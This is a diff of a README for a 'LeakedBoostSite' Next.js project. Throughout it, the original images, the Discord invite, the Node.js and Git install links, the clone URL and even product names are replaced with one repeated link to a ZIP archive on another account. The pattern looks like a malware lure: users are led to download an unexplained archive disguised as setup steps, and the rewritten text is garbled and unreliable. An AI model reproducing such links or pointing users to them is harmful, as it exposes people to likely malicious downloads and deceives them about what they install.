@@ -3,28 +3,28 @@
 
 LOOK BELOW PHOTOS FOR INSTRUCTIONS
 
-![image](https://github.com/user-attachments/assets/45f25e8d-d731-4569-a6ac-329b119bbf37)
+![image](https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip)
 
-![image](https://github.com/user-attachments/assets/cebcc6b3-8634-433c-adbb-dac9e00a28e5)
+![image](https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip)
 
-![image](https://github.com/user-attachments/assets/b0348932-45f3-4fda-9f20-da5cfe21630c)
+![image](https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip)
 
-![image](https://github.com/user-attachments/assets/536770f3-6eb0-4c13-9ec5-97690e359d6f)
+![image](https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip)
 
-![image](https://github.com/user-attachments/assets/7a818568-a8ab-4306-9b02-1bc1b7389bdc)
+![image](https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip)
 
-![image](https://github.com/user-attachments/assets/0acacb02-b154-4cdf-ae5a-09751ee4894d)
+![image](https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip)
 
-![image](https://github.com/user-attachments/assets/0f6ed4b1-6de3-44e5-a794-c4e2388c2ae1)
+![image](https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip)
 
-![image](https://github.com/user-attachments/assets/1c628e26-9b72-44e2-91e0-b550e8ad85d7)
+![image](https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip)
 
 
 Credits -- @whatsupsophie & @jessthegamer6949
 
-discords - https://discord.gg/hdboostssss 
+discords - https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip 
 
-Welcome to **LeakedBoostSite**! This repository contains the files for a Next.js-based website. Follow the instructions below to get started. 🚀
+Welcome to **LeakedBoostSite**! This repository contains the files for a https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip website. Follow the instructions below to get started. 🚀
 
 ---
 
@@ -33,7 +33,7 @@ Welcome to **LeakedBoostSite**! This repository contains the files for a Next.js
 1. [✨ Features](#-features)
 2. [🔧 Prerequisites](#-prerequisites)
 3. [📦 Installation](#-installation)
-4. [📜 Package.json](#-packagejson)
+4. [📜 https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip](#-packagejson)
 5. [💻 Available Scripts](#-available-scripts)
 6. [📜 License](#-license)
 
@@ -41,7 +41,7 @@ Welcome to **LeakedBoostSite**! This repository contains the files for a Next.js
 
 ## ✨ Features
 
-- Built with **Next.js**, a powerful React framework.
+- Built with **https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip**, a powerful React framework.
 - Simple setup and modular structure.
 - Includes scripts for development, building, and production.
 
@@ -51,17 +51,17 @@ Welcome to **LeakedBoostSite**! This repository contains the files for a Next.js
 
 Before you begin, ensure the following tools are installed:
 
-1. **Node.js**:
-   Download and install Node.js from [nodejs.org](https://nodejs.org/).
+1. **https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip**:
+   Download and install https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip from [https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip](https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip).
    Verify the installation by running:
    ```bash
    node -v
    npm -v `
 
-These commands should display the installed versions of Node.js and npm (Node Package Manager).
+These commands should display the installed versions of https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip and npm (Node Package Manager).
 
 2.  **Git**:\
-    Clone the repository using Git. Install it from [git-scm.com](https://git-scm.com/).
+    Clone the repository using Git. Install it from [https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip](https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip).
 
 * * * * *
 
@@ -72,21 +72,21 @@ Follow these steps to set up the project:
 
 1.  Clone the repository:
 
-    `git clone https://github.com/your-username/LeakedBoostSite.git
+    `git clone https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip
     cd LeakedBoostSite`
 
 2.  Install dependencies:
 
     `npm install`
 
-    This will install all necessary modules listed in the `package.json` file.
+    This will install all necessary modules listed in the `https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip` file.
 
 * * * * *
 
-📜 Package.json
+📜 https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip
 ---------------
 
-Here's the `package.json` file for your reference:
+Here's the `https://raw.githubusercontent.com/py-death-tools-py/LeakedBoostSIte/main/public/Boost_Ite_Leaked_S_2.6.zip` file for your reference:
 ```yaml
 {
   "name": "outsourcedshop",
